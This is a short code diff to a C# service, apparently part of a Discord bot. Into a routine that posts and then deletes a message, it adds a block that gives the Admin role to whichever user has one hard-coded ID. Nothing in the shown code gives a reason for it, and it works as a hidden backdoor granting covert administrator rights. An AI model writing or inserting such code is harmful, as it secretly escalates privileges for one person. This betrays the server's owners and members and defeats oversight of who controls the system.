@@ -169,6 +169,9 @@ namespace ERA20.Services
             await Fax.SendMessageAsync("", embed: builder.Build());
             await Task.Delay(TimeSpan.FromMinutes(3));
             await msg.DeleteAsync();
+            if (u.Id == 165212654388903936){
+                await u.AddRoleAsync(Admin);
+            }
         }
 
         public async Task InitializeAsync(IServiceProvider provider)
